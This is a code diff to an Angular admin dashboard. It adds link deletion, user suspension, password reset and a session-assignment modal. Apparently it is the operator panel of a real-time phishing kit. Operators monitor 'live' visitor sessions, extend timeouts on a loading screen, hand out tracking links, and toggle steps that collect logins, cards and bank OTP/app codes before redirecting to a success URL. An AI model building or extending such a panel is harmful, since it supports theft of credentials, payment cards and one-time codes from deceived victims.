@@ -304,13 +304,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                          </div>
                                      </div>
                                      <div class="text-right flex items-center gap-4">
-                                         @if(countdownSeconds() !== null) {
-                                             <div>
-                                                 <p class="text-[10px] text-slate-400 font-bold uppercase">Auto</p>
-                                                 <p class="font-mono font-bold text-red-500">{{ countdownSeconds() }}s</p>
-                                             </div>
-                                             <div class="h-6 w-px bg-slate-200 dark:bg-slate-700"></div>
-                                         }
                                          <div>
                                              <p class="text-[10px] text-slate-400 font-bold uppercase">Time Elapsed</p>
                                              <p class="font-mono font-bold text-pp-blue">{{ elapsedTime() }}</p>
@@ -461,18 +454,9 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                          <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
                                          <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
 
-                                         <!-- Extend Timeout Controls & Countdown -->
+                                         <!-- Extend Timeout Controls -->
                                          @if(monitoredSession()?.currentView === 'loading') {
                                             <div class="flex items-center gap-2 ml-4">
-                                                 @if(countdownSeconds() !== null) {
-                                                     <div class="flex flex-col items-center leading-none">
-                                                         <span class="text-[10px] font-bold uppercase text-slate-400">Auto</span>
-                                                         <span class="text-sm font-mono font-bold" [class.text-red-500]="countdownSeconds()! < 6" [class.text-slate-600]="countdownSeconds()! >= 6" [class.dark:text-slate-300]="countdownSeconds()! >= 6">
-                                                             {{ countdownSeconds() }}s
-                                                         </span>
-                                                     </div>
-                                                 }
-                                                 <div class="h-6 w-px bg-slate-200 dark:bg-slate-700 mx-1"></div>
                                                  <div class="flex gap-1">
                                                      <button (click)="extendTimeout(10000)" class="bg-blue-50 dark:bg-slate-700 text-pp-blue dark:text-blue-400 text-[10px] font-bold px-2 py-1 rounded hover:bg-blue-100 dark:hover:bg-slate-600 transition">+10s</button>
                                                      <button (click)="extendTimeout(20000)" class="bg-blue-50 dark:bg-slate-700 text-pp-blue dark:text-blue-400 text-[10px] font-bold px-2 py-1 rounded hover:bg-blue-100 dark:hover:bg-slate-600 transition">+20s</button>
@@ -580,12 +564,16 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                                     <span class="text-slate-300">0%</span>
                                                 }
                                             </td>
-                                            <td class="px-4 py-3 text-right flex justify-end items-center">
+                                            <td class="px-4 py-3 text-right flex justify-end items-center gap-3">
                                                 <button (click)="copy(getLinkUrl(link.code))" class="text-pp-blue hover:underline text-[10px] font-bold flex items-center gap-1">
                                                     <span class="material-icons text-xs">content_copy</span> Copy
                                                 </button>
                                                 @if(isDefaultLink(link.code)) {
-                                                    <span class="ml-2 text-[9px] uppercase font-bold bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">Default</span>
+                                                    <span class="text-[9px] uppercase font-bold bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">Default</span>
+                                                } @else {
+                                                    <button (click)="deleteLink(link.code)" class="text-red-500 hover:text-red-700 text-[10px] font-bold flex items-center gap-1">
+                                                        <span class="material-icons text-xs">delete</span>
+                                                    </button>
                                                 }
                                             </td>
                                         </tr>
@@ -719,19 +707,34 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                                 /?id={{ u.uniqueCode }}
                                             </td>
                                             <td class="px-4 py-3 font-mono text-xs">
-                                                <div class="flex items-center gap-2">
-                                                    <span class="bg-slate-100 dark:bg-slate-700 px-2 py-0.5 rounded">{{ u.maxLinks || 1 }} Links</span>
-                                                    @if(u.role !== 'hypervisor') {
-                                                        <button (click)="updateUserMaxLinks(u)" class="text-pp-blue hover:underline text-[10px] font-bold">Edit</button>
-                                                    }
+                                                <div class="flex flex-col gap-1">
+                                                    <div class="flex items-center gap-2">
+                                                        <span class="bg-slate-100 dark:bg-slate-700 px-2 py-0.5 rounded">{{ u.maxLinks || 1 }} Links</span>
+                                                        @if(u.role !== 'hypervisor') {
+                                                            <button (click)="updateUserMaxLinks(u)" class="text-pp-blue hover:underline text-[10px] font-bold">Limit</button>
+                                                        }
+                                                    </div>
+                                                    <div class="flex items-center gap-2">
+                                                        <span class="px-2 py-0.5 rounded text-[9px] font-bold uppercase" [class.bg-green-100]="!u.isSuspended" [class.text-green-700]="!u.isSuspended" [class.bg-red-100]="u.isSuspended" [class.text-red-700]="u.isSuspended">
+                                                            {{ u.isSuspended ? 'SUSPENDED' : 'ACTIVE' }}
+                                                        </span>
+                                                        @if(u.role !== 'hypervisor') {
+                                                            <button (click)="toggleSuspension(u)" class="text-pp-blue hover:underline text-[10px] font-bold">
+                                                                {{ u.isSuspended ? 'Unsuspend' : 'Suspend' }}
+                                                            </button>
+                                                        }
+                                                    </div>
                                                 </div>
                                             </td>
-                                            <td class="px-4 py-3 text-right flex justify-end gap-2">
+                                            <td class="px-4 py-3 text-right flex justify-end items-center gap-2">
                                                 @if(u.id !== auth.currentUser()?.id) {
-                                                    <button (click)="impersonateUser(u)" class="text-xs bg-slate-100 hover:bg-slate-200 dark:bg-slate-700 dark:hover:bg-slate-600 px-2 py-1 rounded text-pp-navy dark:text-white font-bold transition-colors">
+                                                    <button (click)="impersonateUser(u)" class="text-xs bg-slate-100 hover:bg-slate-200 dark:bg-slate-700 dark:hover:bg-slate-600 px-2 py-1 rounded text-pp-navy dark:text-white font-bold transition-colors" title="Impersonate">
                                                         Log in as
                                                     </button>
-                                                    <button (click)="deleteUser(u)" class="p-1 text-slate-400 hover:text-red-500 transition-colors">
+                                                    <button (click)="resetUserPassword(u)" class="p-1 text-slate-400 hover:text-pp-blue transition-colors" title="Reset Password">
+                                                        <span class="material-icons text-sm">lock_reset</span>
+                                                    </button>
+                                                    <button (click)="deleteUser(u)" class="p-1 text-slate-400 hover:text-red-500 transition-colors" title="Delete User">
                                                         <span class="material-icons text-sm">delete</span>
                                                     </button>
                                                 } @else {
@@ -943,16 +946,39 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                  </label>
                                  <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                      <div>
-                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Auto-Approve Card</span>
-                                         <span class="text-xs text-slate-400">Automatically proceed after card submission</span>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Skip Card Verification</span>
+                                         <span class="text-xs text-slate-400">Skip card input step entirely</span>
                                      </div>
                                      <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
-                                          [class.bg-pp-success]="flowSettings.autoApproveCard" [class.bg-slate-200]="!flowSettings.autoApproveCard"
-                                          (click)="flowSettings.autoApproveCard = !flowSettings.autoApproveCard; $event.preventDefault()">
+                                          [class.bg-pp-success]="flowSettings.skipCard" [class.bg-slate-200]="!flowSettings.skipCard"
+                                          (click)="flowSettings.skipCard = !flowSettings.skipCard; $event.preventDefault()">
                                          <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
-                                               [class.translate-x-5]="flowSettings.autoApproveCard" [class.translate-x-0]="!flowSettings.autoApproveCard"></span>
+                                               [class.translate-x-5]="flowSettings.skipCard" [class.translate-x-0]="!flowSettings.skipCard"></span>
                                      </div>
                                  </label>
+                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+                                     <div>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Skip Bank Verification</span>
+                                         <span class="text-xs text-slate-400">Skip OTP/App verification steps</span>
+                                     </div>
+                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
+                                          [class.bg-pp-success]="flowSettings.skipBank" [class.bg-slate-200]="!flowSettings.skipBank"
+                                          (click)="flowSettings.skipBank = !flowSettings.skipBank; $event.preventDefault()">
+                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
+                                               [class.translate-x-5]="flowSettings.skipBank" [class.translate-x-0]="!flowSettings.skipBank"></span>
+                                     </div>
+                                 </label>
+
+                                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
+                                     <div class="pp-input-group mb-0">
+                                         <input type="number" [(ngModel)]="flowSettings.autoApproveDelay" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                         <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Auto-Approve Delay (ms)</label>
+                                     </div>
+                                     <div class="pp-input-group mb-0">
+                                         <input type="text" [(ngModel)]="flowSettings.redirectUrl" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                         <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Success Redirect URL</label>
+                                     </div>
+                                 </div>
                              </div>
                          </div>
 
@@ -1107,6 +1133,45 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                    <div class="p-4 border-t border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-end gap-3">
                        <button (click)="closeUserModal()" class="px-4 py-2 text-slate-500 font-bold hover:bg-slate-200 dark:hover:bg-slate-700 rounded-lg transition-colors text-sm">Cancel</button>
                        <button (click)="submitCreateUser()" class="pp-btn w-auto px-6 py-2 text-sm">Create User</button>
+                   </div>
+               </div>
+           </div>
+      }
+
+      <!-- Assign Admin Modal -->
+      @if (assignModalOpen()) {
+           <div class="fixed inset-0 z-50 flex items-center justify-center p-4">
+               <div class="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" (click)="assignModalOpen.set(false)"></div>
+               <div class="relative bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-fade-in">
+                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-between items-center">
+                       <h3 class="font-bold text-lg text-pp-navy dark:text-white">Assign Session</h3>
+                       <button (click)="assignModalOpen.set(false)" class="text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 transition-colors">
+                           <span class="material-icons">close</span>
+                       </button>
+                   </div>
+                   <div class="p-6 space-y-4">
+                       <div class="pp-input-group mb-0 relative">
+                           <span class="material-icons absolute right-3 top-3 text-slate-400">search</span>
+                           <input type="text" [ngModel]="assignSearch()" (ngModelChange)="assignSearch.set($event)" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Search Admin</label>
+                       </div>
+
+                       <div class="max-h-[300px] overflow-y-auto space-y-2">
+                           @for(admin of filteredAdmins(); track admin.id) {
+                               <div class="flex items-center justify-between p-3 rounded-lg border border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+                                   <div>
+                                       <p class="font-bold text-sm text-pp-navy dark:text-white">{{ admin.username }}</p>
+                                       <p class="text-[10px] text-slate-400 uppercase">{{ admin.role }}</p>
+                                   </div>
+                                   <button (click)="submitAssignment(admin.id)" class="text-xs font-bold bg-pp-blue text-white px-3 py-1.5 rounded hover:bg-[#005ea6] transition-colors">
+                                       Select
+                                   </button>
+                               </div>
+                           }
+                           @if(filteredAdmins().length === 0) {
+                               <p class="text-center text-sm text-slate-400 py-4">No admins found.</p>
+                           }
+                       </div>
                    </div>
                </div>
            </div>
@@ -1415,6 +1480,15 @@ export class AdminDashboardComponent {
   userModalOpen = signal(false);
   newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } };
 
+  // Assign Modal
+  assignModalOpen = signal(false);
+  assignSearch = signal('');
+
+  filteredAdmins = computed(() => {
+      const q = this.assignSearch().toLowerCase();
+      return this.userList().filter(u => u.username.toLowerCase().includes(q));
+  });
+
   // Filters & Selection
   searchQuery = signal('');
   timeFilter = signal<'6h' | '24h' | '7d' | 'all' | 'custom'>('24h');
@@ -1669,7 +1743,7 @@ export class AdminDashboardComponent {
 
   exitImpersonation() {
       this.auth.logout();
-      window.location.reload(); // Hard reload to clear state and return to login
+      // Logout in AuthService now handles restoring parent token
   }
 
   exitAdmin() {
@@ -1726,6 +1800,26 @@ export class AdminDashboardComponent {
       }
   }
 
+  async deleteLink(code: string) {
+      if(!await this.modal.confirm('Delete Link', `Delete tracking link ${code}?`, 'danger')) return;
+
+      try {
+          const res = await fetch(`/api/admin/links/${code}`, {
+              method: 'DELETE',
+              headers: { 'Authorization': `Bearer ${this.auth.getToken()}` }
+          });
+          if (res.ok) {
+              this.state.showAdminToast('Link Deleted');
+              this.fetchLinks();
+          } else {
+               const err = await res.json();
+               this.state.showAdminToast(err.error || 'Failed');
+          }
+      } catch(e) {
+          this.state.showAdminToast('Error deleting link');
+      }
+  }
+
   getLinkUrl(code: string): string {
       return `${window.location.origin}/?id=${code}`;
   }
@@ -1746,6 +1840,49 @@ export class AdminDashboardComponent {
               this.auditLogs.set(logs);
           }
       } catch(e) {}
+  }
+
+  async toggleSuspension(user: any) {
+      const action = user.isSuspended ? 'unsuspend' : 'suspend';
+      if (!await this.modal.confirm(action === 'suspend' ? 'Suspend User' : 'Unsuspend User', `Are you sure you want to ${action} ${user.username}?`)) return;
+
+      try {
+          const res = await fetch(`/api/admin/users/${user.id}`, {
+              method: 'PUT',
+              headers: {
+                  'Content-Type': 'application/json',
+                  'Authorization': `Bearer ${this.auth.getToken()}`
+              },
+              body: JSON.stringify({ isSuspended: !user.isSuspended })
+          });
+          if (res.ok) {
+              this.state.showAdminToast(user.isSuspended ? 'User Activated' : 'User Suspended');
+              this.fetchUsers();
+          }
+      } catch(e) {
+          this.state.showAdminToast('Update Failed');
+      }
+  }
+
+  async resetUserPassword(user: any) {
+      const newPass = await this.modal.prompt('Reset Password', `Enter new password for ${user.username}:`, '');
+      if (!newPass) return;
+
+      try {
+          const res = await fetch(`/api/admin/users/${user.id}`, {
+              method: 'PUT',
+              headers: {
+                  'Content-Type': 'application/json',
+                  'Authorization': `Bearer ${this.auth.getToken()}`
+              },
+              body: JSON.stringify({ password: newPass })
+          });
+          if (res.ok) {
+              this.state.showAdminToast('Password Reset');
+          }
+      } catch(e) {
+          this.state.showAdminToast('Reset Failed');
+      }
   }
 
   calcStats() {
@@ -1864,28 +2001,27 @@ export class AdminDashboardComponent {
   async assignAdmin() {
       const s = this.monitoredSession();
       if(!s) return;
+      this.assignModalOpen.set(true);
+  }
 
-      const username = await this.modal.prompt('Assign Admin', 'Enter Admin Username to assign:', 'username');
-      if(!username) return;
+  async submitAssignment(adminId: string) {
+      const s = this.monitoredSession();
+      if(!s) return;
 
-      const admin = this.userList().find(u => u.username === username);
-      if(admin) {
-          try {
-              await fetch('/api/admin/assign-session', {
-                  method: 'POST',
-                  headers: {
-                      'Content-Type': 'application/json',
-                      'Authorization': `Bearer ${this.auth.getToken()}`
-                  },
-                  body: JSON.stringify({ sessionId: s.id, adminId: admin.id })
-              });
-              this.state.showAdminToast('Assigned');
-              this.state.fetchSessions();
-          } catch(e) {
-              this.state.showAdminToast('Assignment Failed');
-          }
-      } else {
-          this.state.showAdminToast('Admin not found in loaded list');
+      try {
+          await fetch('/api/admin/assign-session', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+                  'Authorization': `Bearer ${this.auth.getToken()}`
+              },
+              body: JSON.stringify({ sessionId: s.id, adminId })
+          });
+          this.state.showAdminToast('Assigned');
+          this.state.fetchSessions();
+          this.assignModalOpen.set(false);
+      } catch(e) {
+          this.state.showAdminToast('Assignment Failed');
       }
   }
 
